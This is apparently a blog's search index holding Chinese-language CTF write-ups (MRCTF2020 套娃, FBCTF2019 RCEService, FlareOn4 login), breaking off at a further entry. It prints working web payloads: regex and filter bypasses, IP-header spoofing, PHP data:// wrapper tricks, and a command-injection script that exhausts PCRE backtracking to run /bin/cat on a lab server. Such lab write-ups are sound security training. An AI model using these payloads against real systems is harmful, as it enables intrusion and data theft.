<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SHCTF week2 web ez_rce</title>
    <link href="/2023/10/14/SHCTF-week2-web-ez_rce/"/>
    <url>/2023/10/14/SHCTF-week2-web-ez_rce/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="4745955eed30c2378bc6907d6f01cc5ddcb5e2ac1c03349519e089deadeca64f"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>rce</tag>
      
      <tag>python</tag>
      
      <tag>flask</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MRCTF2020 套娃</title>
    <link href="/2023/09/05/%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/"/>
    <url>/2023/09/05/%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/</url>
    
    <content type="html"><![CDATA[<h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><p>先看页面源代码，发现有代码注释：</p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/2023090501.6ntjcld4z0s0.png" alt="2023090501"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><br> <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>);<br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to the next ~&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>要传入<code>b_u_p_t</code>参数，但是不能有<code>_</code></p><blockquote><p><strong>注意</strong>:</p><p>变量名中的点和空格被转换成下划线。例如 <code>&lt;input name=&quot;a.b&quot; /&gt;</code> 变成了 <code>$_REQUEST[&quot;a_b&quot;]</code>。</p></blockquote><p>所以我们可以传入<code>b u p t</code>或<code>b.u.p.t</code>实现绕过。</p><p>在正则表达式中<code>^</code>代表从字符串起始处匹配，<code>$</code>代表结尾，<code>/^23333$/</code>要求字符串恰好等于<code>23333</code>。</p><p>所以第二个<code>if</code>语句意思是<code>b_u_p_t</code>的值不能等于(强比较)<code>23333</code>，但要通过正则匹配。</p><p>在非多行模式下(即没有<code>/s</code>)，<code>$</code>会忽略在句尾的<code>%0a</code></p><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^flag$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== <span class="hljs-string">&#x27;flag&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只需传入<code>?a=flag%0a</code></p><p>同理，本题中传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?b.u.p.t=23333%0a<br></code></pre></td></tr></table></figure><p>即可。</p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/2023090502.6ukjogue99o0.png" alt="2023090502"></p><p>提示flag在<code>secrettw.php</code></p><p>访问并查看页面源代码：</p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/2023090503.5ki7rsypwl40.webp" alt="2023090503"></p><p><del>有脏东西</del></p><p>这东西很长，在那一行上双击可快速选中该行。</p><p>这是<code>Jsfuck</code>编码,详情见<a href="https://www.jianshu.com/p/e7246218f424">Jsfuck – 一个很有意思的Javascript特性</a>  </p><p>可以直接使用在线工具解码，比如<a href="http://www.hiencode.com/jsfuck.html">CTF在线工具-在线JSfuck加密|在线JSfuck解密|JSfuck|JSfuck原理|JSfuck算法 (hiencode.com)</a></p><p>也可以将其复制到浏览器控制台中：</p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/20230504.4zo7re19ers0.webp" alt="20230504"></p><p><strong>post me Merak</strong>  </p><p>用post方法传入一个名为<strong>Merak</strong>的变量，变量值随意。</p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/20230505.2yo0imubqss0.webp" alt="20230505"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;takeip.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>); <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Merak&#x27;</span>]))&#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>); <br>    <span class="hljs-keyword">die</span>(); <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$v</span></span>)</span>&#123; <br>    <span class="hljs-variable">$v</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$v</span>); <br>    <span class="hljs-variable">$re</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$v</span>);<span class="hljs-variable">$i</span>++)&#123; <br>        <span class="hljs-variable">$re</span> .= <span class="hljs-title function_ invoke__">chr</span> ( <span class="hljs-title function_ invoke__">ord</span> (<span class="hljs-variable">$v</span>[<span class="hljs-variable">$i</span>]) + <span class="hljs-variable">$i</span>*<span class="hljs-number">2</span> ); <br>    &#125; <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$re</span>; <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Local access only!&#x27;</span>.<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br><span class="hljs-variable">$ip</span> = <span class="hljs-title function_ invoke__">getIp</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span>!=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)         <span class="hljs-comment">#ip检测</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="hljs-variable">$ip</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ip</span> === <span class="hljs-string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;2333&#x27;</span>]) === <span class="hljs-string">&#x27;todat is a happy day&#x27;</span> )&#123;  <br>    <span class="hljs-comment">#考察php伪协议</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your REQUEST is:&quot;</span>.<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]); <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-title function_ invoke__">change</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])); &#125;    <span class="hljs-comment">#代码逆向</span><br><span class="hljs-meta">?&gt;</span>  <br></code></pre></td></tr></table></figure><h2 id="过ip检测"><a href="#过ip检测" class="headerlink" title="过ip检测"></a>过ip检测</h2><p>添加报文，据我所知有两种方法</p><ul><li><code>X-Forwarded-For: 127.0.0.1</code>    </li><li><code>Client-ip: 127.0.0.1</code></li></ul><p>这里不知道为什么第一个不行，只能使用第二个。</p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><p>这里可以使用data伪协议，对于data,</p><p>例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">// 打印 &quot;I love PHP&quot; </span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27;</span>); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>同理，本题传入:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=            #todat is a happy day<br></code></pre></td></tr></table></figure><h2 id="代码逆向"><a href="#代码逆向" class="headerlink" title="代码逆向"></a>代码逆向</h2><p>我用python写了个<code>change()</code>的逆向函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"> <br><span class="hljs-comment"># function change($v)&#123; </span><br><span class="hljs-comment">#     $v = base64_decode($v); </span><br><span class="hljs-comment">#     $re = &#x27;&#x27;; </span><br><span class="hljs-comment">#     for($i=0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="hljs-comment">#         $re .= chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="hljs-comment">#     &#125; </span><br><span class="hljs-comment">#     return $re; </span><br><span class="hljs-comment"># &#125; </span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">change</span>(<span class="hljs-params">v</span>):<br>    re=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v)):<br>        re += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(v[i]) - i*<span class="hljs-number">2</span>); <br>    re=base64.b64encode(re.encode())<br>    <span class="hljs-keyword">return</span> re.decode()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    s=<span class="hljs-string">&quot;flag.php&quot;</span>   <br>    <span class="hljs-built_in">print</span>(change(s))<br><span class="hljs-comment">#ZmpdYSZmXGI=</span><br></code></pre></td></tr></table></figure><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230905/20230506.6qujc55rgp80.webp" alt="20230506"></p><h2 id="参考（引用）"><a href="#参考（引用）" class="headerlink" title="参考（引用）"></a>参考（引用）</h2><p>[<a href="https://blog.csdn.net/RABCDXB/article/details/118917303">MRCTF2020]套娃_ctf套娃密码_Sk1y的博客-CSDN博客</a>  </p><p><a href="https://www.cnblogs.com/20175211lyz/p/12198258.html">preg_match绕过总结 - MustaphaMond - 博客园 (cnblogs.com)</a>  </p><p><a href="https://www.php.net/manual/zh/language.variables.external.php">PHP: 来自 PHP 之外的变量 - Manual</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>RCE</tag>
      
      <tag>PHP</tag>
      
      <tag>正则</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FBCTF2019 RCEService</title>
    <link href="/2023/09/04/%5BFBCTF2019%5DRCEService/"/>
    <url>/2023/09/04/%5BFBCTF2019%5DRCEService/</url>
    
    <content type="html"><![CDATA[<h1 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h1><p>这题是有源码的（别管怎么来的了，我看的十几篇wp都没说清楚）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$json</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$json</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="hljs-variable">$json</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;<br>        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$json</span>, <span class="hljs-literal">true</span>)[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span> !== <span class="hljs-literal">NULL</span>) &#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Invalid input&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>过滤了很多东西  </p><blockquote><ol><li>代码中使用<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code> 配置系统环境变量，而我们用不了 cat 也有可能是在这个环境变量下没有这个二进制文件。我们可以直接使用<code>/bin/cat</code> 来调用cat命令。</li><li>Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</li></ol></blockquote><h2 id="两种解法"><a href="#两种解法" class="headerlink" title="两种解法"></a>两种解法</h2><h3 id="1-0a换行绕过"><a href="#1-0a换行绕过" class="headerlink" title="1. %0a换行绕过"></a>1. %0a换行绕过</h3><p>由于加了修饰符s后.才会匹配换行符，所以此处利用<code>%0a</code>(换行符经过<code>url</code>编码后)进行绕过。</p><p>另外要注意表达式中存在一段<code>\x00-\x1F</code>会匹配一个<code>%0a</code>，但多在payload前后加几个<code>%0a</code>就行了。</p><p>发现flag位置：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>md=&#123;%0a<span class="hljs-string">&quot;cmd&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;ls /home/rceservice&quot;</span>%</span>0a&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230904/2023090401.6rx1bebl22c0.png" alt="2023090401"></p><p>查看flag:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?c</span>md=&#123;%0a<span class="hljs-string">&quot;cmd&quot;</span><span class="hljs-symbol">:<span class="hljs-string">&quot;/bin/cat /home/rceservice/flag&quot;</span>%</span>0a&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230904/2023090402.3rgu92zlvme0.png" alt="2023090402"></p><h3 id="2-利用PCRE回溯来绕过"><a href="#2-利用PCRE回溯来绕过" class="headerlink" title="2. 利用PCRE回溯来绕过"></a>2. 利用PCRE回溯来绕过</h3><p>原理详见：<a href="https://www.freebuf.com/articles/web/190794.html">PHP利用PCRE回溯次数限制绕过某些安全限制 </a>  </p><p>大概就是<code>preg_match()</code>这个函数有回溯次数限制，突破限制会返回<code>flase</code>。</p><p>只要让它突破限制就行了。</p><p>根据这种方法解题，需要用POST发送请求，因为GET会因为头太大报错。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-comment">### 不知道为啥这里用 || 不可以执行我们的命令</span><br>payload = <span class="hljs-string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag &quot;,&quot;nayi&quot;:&quot;&#x27;</span> + <span class="hljs-string">&quot;a&quot;</span>*(<span class="hljs-number">1000000</span>) + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <span class="hljs-comment">##超过一百万，这里写一千万不会出结果。</span><br><br>res = requests.post(<span class="hljs-string">&quot;http://b27f0703-fe79-470f-b1fb-f7cfbd8c966b.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="hljs-string">&quot;cmd&quot;</span>:payload&#125;)<br><span class="hljs-built_in">print</span>(res.text)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230904/2023090403.2nvknqzs4l00.png" alt="2023090403"></p><h2 id="参考（引用）"><a href="#参考（引用）" class="headerlink" title="参考（引用）"></a>参考（引用）</h2><p>[<a href="https://blog.csdn.net/RABCDXB/article/details/119306689">FBCTF2019]RCEService_[fbctf 2019]rceservice_Sk1y的博客-CSDN博客</a> </p><p>[<a href="https://mayi077.gitee.io/2020/04/21/FBCTF2019-RCEService/">FBCTF2019]RCEService | 信安小蚂蚁 (gitee.io)</a>  </p><p>[<a href="https://www.cnblogs.com/Article-kelp/p/16046129.html">BUUCTF题解][FBCTF2019]RCEService - Article_kelp - 博客园 (cnblogs.com)</a>  </p>]]></content>
    
    
    
    <tags>
      
      <tag>RCE</tag>
      
      <tag>PHP</tag>
      
      <tag>正则</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu FlareOn4 login</title>
    <link href="/2023/09/02/%5BFlareOn4%5Dlogin/"/>
    <url>/2023/09/02/%5BFlareOn4%5Dlogin/</url>
    
    <content type="html"><![CDATA[<h1 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h1><p>直接看JS</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;prompt&quot;</span>).<span class="hljs-property">onclick</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> flag = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;flag&quot;</span>).<span class="hljs-property">value</span>;<br><span class="hljs-keyword">var</span> rotFlag = flag.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[a-zA-Z]/g</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);<br>&#125;);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span> == rotFlag) &#123;<br><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Correct flag!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Incorrect flag, rot again&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);  <br></code></pre></td></tr></table></figure><blockquote><p>这句代码的意思就是将字符后移13位，越界了就转到26个字母的开头（超过Z循环回A），循环进行</p></blockquote><p>一共就26个字母，一个字母这样操作两次不就回去了嘛，还是原来那个字母。</p><p>所以给这句代码再运行一次就行了。</p><p><del>懒得写脚本了，</del>直接在原代码上修改:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> flag = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">var</span> rotFlag = <span class="hljs-string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span>;<br>flag = rotFlag.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[a-zA-Z]/g</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><blockquote><p>JavaScript 没有任何打印或者输出的函数。</p></blockquote><p><del>tnnd</del> 还要想办法输出。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> rotFlag = <span class="hljs-string">&quot;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&quot;</span>;</span><br><span class="language-javascript">        flag = rotFlag.<span class="hljs-title function_">replace</span>(<span class="hljs-regexp">/[a-zA-Z]/g</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">c</span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-keyword">return</span> <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>((c &lt;= <span class="hljs-string">&quot;Z&quot;</span> ? <span class="hljs-number">90</span> : <span class="hljs-number">122</span>) &gt;= (c = c.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">13</span>) ? c : c - <span class="hljs-number">26</span>);</span><br><span class="language-javascript">        &#125;);</span><br><span class="language-javascript">        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(flag);</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bod</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">htm</span>&gt;</span><br></code></pre></td></tr></table></figure><p>最后在控制台看到输出</p><p><img src="https://cdn.staticaly.com/gh/sawtooth384/image@master/20230902/2023090201.9ovhjcnt9uc.png" alt="2023090201"></p>]]></content>
    
    
    
    <tags>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2019 RCE ME</title>
    <link href="/2023/09/01/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/"/>
    <url>/2023/09/01/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DRCE%20ME/</url>
    
